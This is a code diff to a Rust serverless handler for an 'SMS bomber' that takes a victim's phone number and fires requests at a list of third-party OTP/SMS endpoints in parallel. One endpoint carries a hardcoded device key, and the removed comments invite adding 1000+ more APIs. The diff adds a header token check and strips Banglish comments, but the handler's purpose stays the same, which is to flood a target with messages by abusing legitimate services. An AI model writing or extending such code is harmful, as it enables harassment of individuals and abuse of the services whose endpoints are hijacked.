@@ -24,12 +24,20 @@ async fn main() -> Result<(), Error> {
 }
 
 pub async fn handler(req: Request) -> Result<Response<Body>, Error> {
-    // Method check
+    // --- 🛡️ API PROTECTION CONNECTION START ---
+    // JavaScript protection layer theke asha Auth Token check kora hochhe
+    let auth_token = req.headers().get("x-auth-token");
+    if auth_token.is_none() {
+        return Ok(Response::builder()
+            .status(StatusCode::UNAUTHORIZED)
+            .body(json!({"error": "Unauthorized", "message": "Security token missing!"}).to_string().into())?);
+    }
+    // --- 🛡️ API PROTECTION CONNECTION END ---
+
     if req.method() != "POST" {
         return Ok(Response::builder().status(StatusCode::METHOD_NOT_ALLOWED).body("POST Only".into())?);
     }
 
-    // JSON Parse (Frontend theke asha number)
     let body: BombRequest = match serde_json::from_slice(req.body()) {
         Ok(val) => val,
         Err(_) => return Ok(Response::builder().status(StatusCode::BAD_REQUEST).body("Invalid JSON".into())?),
@@ -37,12 +45,10 @@ pub async fn handler(req: Request) -> Result<Response<Body>, Error> {
 
     let target_number = body.number;
     let client = Client::builder()
-        .timeout(Duration::from_secs(9)) // Vercel limited time handle korte
+        .timeout(Duration::from_secs(9)) 
         .build()?;
 
-    // ============================================================
-    // 2. API LIST (Ekhane apni 1000+ API add korte parben)
-    // ============================================================
+    // 2. API LIST (Add your 1000+ APIs here)
     let apis = vec![
         SmsApi {
             name: "Shadhin Music",
@@ -68,8 +74,6 @@ pub async fn handler(req: Request) -> Result<Response<Body>, Error> {
             method: "POST",
             body_builder: |p| json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": p}),
         },
-        // --> 3. Niche eivabe aro API add korte thakun
-        // Format: SmsApi { name: "", url: "", method: "POST", body_builder: |p| json!({ "key": p }) },
     ];
 
     let mut tasks = vec![];
@@ -93,7 +97,6 @@ pub async fn handler(req: Request) -> Result<Response<Body>, Error> {
         tasks.push(task);
     }
 
-    // Ultra-Fast Parallel hit
     join_all(tasks).await;
 
     Ok(Response::builder()
